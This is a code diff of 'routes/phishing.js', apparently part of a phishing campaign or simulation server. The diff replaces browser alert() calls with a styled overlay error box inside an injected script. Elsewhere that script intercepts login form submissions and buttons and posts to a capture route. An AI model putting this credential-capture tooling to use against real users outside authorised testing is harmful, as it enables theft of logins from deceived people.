@@ -1,4 +1,4 @@
-// routes/phishing.js - SOLUTION COMPLÈTE CORRIGÉE
+// routes/phishing.js - SOLUTION COMPLÈTE CORRIGÉE (SANS ALERT)
 
 const express = require('express');
 const path = require('path');
@@ -57,7 +57,7 @@ router.get('/:campaignId', async (req, res) => {
             console.warn(`⚠️ Aucun email trouvé pour la campagne ${campaignId}`);
             return res.status(400).send(generateErrorPage(
                 'Email requis', 
-                'Un email valide est requis. Veuillez utiliser le lien reçu par email.'
+                'Un email valide est requis.'
             ));
         }
 
@@ -337,7 +337,7 @@ router.post('/:campaignId/capture', async (req, res) => {
 });
 
 /**
- * *** FONCTION CORRIGÉE *** Script de redirection universel avec validation d'email
+ * *** FONCTION CORRIGÉE *** Script de redirection universel avec validation d'email (SANS ALERT)
  */
 function generateCorrectedRedirectScript() {
     return `
@@ -353,13 +353,45 @@ function generateCorrectedRedirectScript() {
         // VALIDATION STRICTE DE LA SESSION
         if (!session || !session.campaignId) {
             console.error('❌ Données de session invalides:', session);
-            alert('Erreur: Données de session manquantes. Veuillez utiliser le lien reçu par email.');
+            showErrorMessage('Erreur de session', 'Données de session manquantes.');
             return;
         }
         
         console.log('📋 Session détectée:', session);
         interceptFormSubmissions(session);
         interceptLoginButtons(session);
+    }
+
+    function showErrorMessage(title, message) {
+        // Créer une overlay d'erreur moderne au lieu d'un alert
+        const overlay = document.createElement('div');
+        overlay.style.cssText = \`
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(0, 0, 0, 0.8); display: flex;
+            justify-content: center; align-items: center; z-index: 10000;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        \`;
+        
+        const errorBox = document.createElement('div');
+        errorBox.style.cssText = \`
+            background: white; padding: 30px; border-radius: 8px; 
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3); max-width: 400px; 
+            text-align: center; margin: 20px;
+        \`;
+        
+        errorBox.innerHTML = \`
+            <div style="color: #dc3545; font-size: 24px; margin-bottom: 15px;">⚠️</div>
+            <h3 style="color: #dc3545; margin: 0 0 15px 0; font-size: 18px;">\${title}</h3>
+            <p style="color: #666; margin: 0 0 20px 0; line-height: 1.4;">\${message}</p>
+            <button onclick="this.parentElement.parentElement.remove()" 
+                    style="background: #dc3545; color: white; border: none; 
+                           padding: 10px 20px; border-radius: 4px; cursor: pointer;">
+                Fermer
+            </button>
+        \`;
+        
+        overlay.appendChild(errorBox);
+        document.body.appendChild(overlay);
     }
 
     function interceptFormSubmissions(session) {
@@ -545,7 +577,7 @@ function generateCorrectedRedirectScript() {
         console.log('🔍 Token dans session:', window.PHISHING_SESSION?.token);
     };
     
-    console.log('✅ Script de redirection corrigé chargé avec validation email');
+    console.log('✅ Script de redirection corrigé chargé sans alert');
 })();
 </script>
 `;
